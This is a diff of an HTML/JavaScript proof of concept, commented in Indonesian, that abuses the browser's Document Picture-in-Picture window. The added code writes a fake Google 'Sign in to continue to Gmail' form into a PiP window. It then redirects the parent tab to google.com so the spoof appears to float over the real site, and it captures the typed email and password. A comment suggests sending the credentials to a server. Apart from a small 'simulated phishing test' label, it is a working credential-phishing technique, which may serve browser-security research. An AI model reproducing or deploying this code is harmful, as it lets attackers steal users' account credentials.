@@ -13,48 +13,6 @@
   button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
   button:hover { background: #1557b0; }
   #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
-
-  /* Konten PiP */
-  #pipContent {
-    display: none;
-    padding: 20px;
-    background: #fff;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-  }
-  #pipContent .g-logo {
-    text-align: center;
-    font-size: 24px;
-    font-weight: bold;
-    color: #4285f4;
-    margin-bottom: 20px;
-  }
-  #pipContent h3 { font-size: 18px; margin-bottom: 10px; text-align: center; }
-  #pipContent p { font-size: 13px; color: #666; text-align: center; margin-bottom: 20px; }
-  #pipContent input {
-    width: 100%;
-    padding: 12px;
-    margin-bottom: 12px;
-    border: 1px solid #ddd;
-    border-radius: 6px;
-    font-size: 14px;
-  }
-  #pipContent button {
-    width: 100%;
-    padding: 12px;
-    background: #1a73e8;
-    color: #fff;
-    border: none;
-    border-radius: 6px;
-    font-size: 14px;
-    font-weight: bold;
-    cursor: pointer;
-  }
-  #pipContent .warning {
-    margin-top: 15px;
-    font-size: 11px;
-    color: #f00;
-    text-align: center;
-  }
 </style>
 </head>
 <body>
@@ -66,104 +24,162 @@
   <div id="status">[*] Ready...</div>
 </div>
 
-<!-- Konten untuk PiP -->
-<div id="pipContent">
-  <div class="g-logo">G</div>
-  <h3>Sign in</h3>
-  <p>to continue to Gmail</p>
-  <input type="email" id="pipEmail" placeholder="Email or phone" autofocus />
-  <input type="password" id="pipPassword" placeholder="Password" />
-  <button id="pipLogin">Next</button>
-  <div class="warning">This is a simulated phishing test. Do not enter real credentials.</div>
-</div>
-
 <script>
 (function () {
   'use strict';
 
   var btn = document.getElementById('startBtn');
   var statusEl = document.getElementById('status');
-  var pipContent = document.getElementById('pipContent');
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PiP Race] " + msg);
+    console.log("[PiP Lifecycle] " + msg);
   }
 
   // ============================================
-  // 1. TRIGGER (KLIK) - RACE CONDITION
+  // 1. TRIGGER (KLIK) - LIFECYCLE BUG
   // ============================================
   btn.addEventListener('click', async function() {
-    log("[*] Memulai race condition: PiP + Google.com...");
+    log("[*] Memulai lifecycle bug exploit...");
 
-    // ============================================
-    // A. BUKA PiP & REDIRECT BERSAMAAN (0ms)
-    // ============================================
-    
-    // 1. Buka PiP (async)
-    const pipPromise = (async () => {
-      try {
-        if (!window.documentPictureInPicture) {
-          alert("Document Picture-in-Picture tidak didukung.");
-          return null;
-        }
-        const pipWindow = await documentPictureInPicture.requestWindow({
-          width: 400,
-          height: 500
-        });
-        
-        // Pindahkan konten phishing ke PiP
-        pipContent.style.display = 'block';
-        pipWindow.document.body.append(pipContent);
-        return pipWindow;
-      } catch (e) {
-        log("PiP Error: " + e.message);
-        return null;
-      }
-    })();
-
-    // 2. REDIRECT KE GOOGLE.COM (LANGSUNG, 0ms)
     try {
-      window.location.href = "https://www.google.com";
-    } catch (e) {}
+      if (!window.documentPictureInPicture) {
+        alert("Document Picture-in-Picture tidak didukung.");
+        return;
+      }
 
-    // 3. Tunggu PiP siap (jika berhasil)
-    const pipWindow = await pipPromise;
-    if (pipWindow) {
-      log('PiP Window Opened. Form login palsu ditampilkan.');
-
-      // Event listener di PiP
-      pipWindow.document.getElementById('pipLogin').addEventListener('click', function() {
-        var email = pipWindow.document.getElementById('pipEmail').value;
-        var password = pipWindow.document.getElementById('pipPassword').value;
-
-        if (!email || !password) {
-          alert("Email dan password harus diisi!");
-          return;
-        }
-
-        log("Captured: " + email + " / " + password);
-
-        // Tampilkan data di halaman utama
-        statusEl.innerHTML = `
-          <div style="background:#000;color:#0f0;padding:10px;border-radius:6px;margin-top:10px;">
-            <strong>Credentials Captured:</strong><br>
-            Email: ${email}<br>
-            Password: ${password}<br>
-            <em>Redirecting to Google...</em>
-          </div>
-        `;
-
-        // Redirect PiP ke Google asli
-        pipWindow.location.href = "https://www.google.com";
-
-        // Tutup PiP setelah 2 detik
-        setTimeout(function() {
-          pipWindow.close();
-        }, 2000);
+      // ============================================
+      // 2. BUKA PiP
+      // ============================================
+      const pipWindow = await documentPictureInPicture.requestWindow({
+        width: 400,
+        height: 500
       });
-    }
 
+      log('PiP Window Opened.');
+
+      // ============================================
+      // 3. TULIS ULANG DOKUMEN PiP (MANDIRI)
+      // ============================================
+      // Kita menulis ulang seluruh dokumen PiP dengan script mandiri.
+      // Script ini tidak bergantung pada parent dan akan tetap berjalan
+      // meskipun parent di-redirect.
+      pipWindow.document.open();
+      pipWindow.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <meta charset="UTF-8">
+          <title>Google Accounts</title>
+          <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+              background: #fff;
+              display: flex;
+              flex-direction: column;
+              justify-content: center;
+              align-items: center;
+              min-height: 100vh;
+              padding: 20px;
+              text-align: center;
+            }
+            .g-logo {
+              font-size: 32px;
+              font-weight: bold;
+              color: #4285f4;
+              margin-bottom: 20px;
+            }
+            h3 { font-size: 20px; color: #333; margin-bottom: 5px; }
+            p { font-size: 13px; color: #666; margin-bottom: 20px; }
+            input {
+              width: 100%;
+              padding: 12px;
+              margin-bottom: 12px;
+              border: 1px solid #ddd;
+              border-radius: 6px;
+              font-size: 14px;
+            }
+            button {
+              width: 100%;
+              padding: 12px;
+              background: #1a73e8;
+              color: #fff;
+              border: none;
+              border-radius: 6px;
+              font-size: 14px;
+              font-weight: bold;
+              cursor: pointer;
+            }
+            .warning {
+              margin-top: 15px;
+              font-size: 11px;
+              color: #f00;
+            }
+          </style>
+        </head>
+        <body>
+          <div class="g-logo">G</div>
+          <h3>Sign in</h3>
+          <p>to continue to Gmail</p>
+          <input type="email" id="pipEmail" placeholder="Email or phone" autofocus />
+          <input type="password" id="pipPassword" placeholder="Password" />
+          <button id="pipLogin">Next</button>
+          <div class="warning">This is a simulated phishing test. Do not enter real credentials.</div>
+
+          <script>
+            (function() {
+              // Script mandiri di dalam PiP
+              // Tidak bergantung pada parent.
+              
+              document.getElementById('pipLogin').addEventListener('click', function() {
+                var email = document.getElementById('pipEmail').value;
+                var password = document.getElementById('pipPassword').value;
+                
+                if (!email || !password) {
+                  alert("Email dan password harus diisi!");
+                  return;
+                }
+
+                // Kirim data ke parent (opsional, via postMessage)
+                // Tapi jika parent sudah redirect, ini mungkin gagal.
+                // Kita bisa mengirim ke server langsung (fetch) atau menyimpannya.
+                
+                // Tampilkan data di PiP (untuk pengujian)
+                document.body.innerHTML = \`
+                  <div style="font-family:monospace;padding:20px;background:#000;color:#0f0;border-radius:6px;width:100%;">
+                    <h3 style="color:#f00;">Credentials Captured!</h3>
+                    <p><strong>Email:</strong> \${email}</p>
+                    <p><strong>Password:</strong> \${password}</p>
+                    <p style="color:#666;margin-top:15px;">Redirecting to Google...</p>
+                  </div>
+                \`;
+
+                // Redirect PiP ke Google asli (setelah 2 detik)
+                setTimeout(function() {
+                  window.location.href = 'https://www.google.com';
+                }, 2000);
+              });
+            })();
+          <\/script>
+        </body>
+        </html>
+      `);
+      pipWindow.document.close();
+
+      log('Persistent payload injected into PiP.');
+
+      // ============================================
+      // 4. REDIRECT PARENT KE GOOGLE.COM (UJI LIFECYCLE)
+      // ============================================
+      setTimeout(function() {
+        log('Redirecting parent to google.com...');
+        window.location.replace('https://www.google.com');
+      }, 1000);
+
+    } catch (e) {
+      log('Error: ' + e.message);
+    }
   }, { once: true });
 
 })();
